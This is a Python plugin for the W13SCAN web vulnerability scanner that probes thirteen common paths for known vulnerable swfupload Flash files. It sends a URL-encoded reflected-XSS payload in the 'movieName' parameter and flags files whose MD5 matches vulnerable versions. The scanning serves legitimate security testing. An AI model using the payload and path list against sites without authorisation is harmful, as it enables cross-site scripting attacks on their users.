#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# @Time    : 2020/4/10 4:26 PM
# @Author  : w8ay
# @File    : swf_files.py

from urllib.parse import urlparse

import requests

from lib.core.common import generateResponse, md5
from lib.core.enums import VulType, PLACE
from lib.core.plugins import PluginBase


class W13SCAN(PluginBase):
    name = '通用flash的xss'

    def audit(self):
        p = urlparse(self.requests.url)

        arg = "{}://{}/".format(p.scheme, p.netloc)

        FileList = []
        FileList.append(arg + 'common/swfupload/swfupload.swf')
        FileList.append(arg + 'adminsoft/js/swfupload.swf')
        FileList.append(arg + 'statics/js/swfupload/swfupload.swf')
        FileList.append(arg + 'images/swfupload/swfupload.swf')
        FileList.append(arg + 'js/upload/swfupload/swfupload.swf')
        FileList.append(arg + 'addons/theme/stv1/_static/js/swfupload/swfupload.swf')
        FileList.append(arg + 'admin/kindeditor/plugins/multiimage/images/swfupload.swf')
        FileList.append(arg + 'includes/js/upload.swf')
        FileList.append(arg + 'js/swfupload/swfupload.swf')
        FileList.append(arg + 'Plus/swfupload/swfupload/swfupload.swf')
        FileList.append(arg + 'e/incs/fckeditor/editor/plugins/swfupload/js/swfupload.swf')
        FileList.append(arg + 'include/lib/js/uploadify/uploadify.swf')
        FileList.append(arg + 'lib/swf/swfupload.swf')

        md5_list = [
            '3a1c6cc728dddc258091a601f28a9c12',
            '53fef78841c3fae1ee992ae324a51620',
            '4c2fc69dc91c885837ce55d03493a5f5',
        ]
        for payload in FileList:
            payload1 = payload + "?movieName=%22]%29}catch%28e%29{if%28!window.x%29{window.x=1;alert%28%22xss%22%29}}//"
            req = requests.get(payload1, headers=self.requests.headers)
            if req.status_code == 200:
                md5_value = md5(req.content)
                if md5_value in md5_list:
                    result = self.new_result()
                    result.init_info(req.url, "Flash通用Xss", VulType.XSS)
                    result.add_detail("payload请求", req.reqinfo, generateResponse(req),
                                      "匹配到存在漏洞的md5:{}".format(md5_value), "", "", PLACE.GET)
                    self.success(result)
                    break
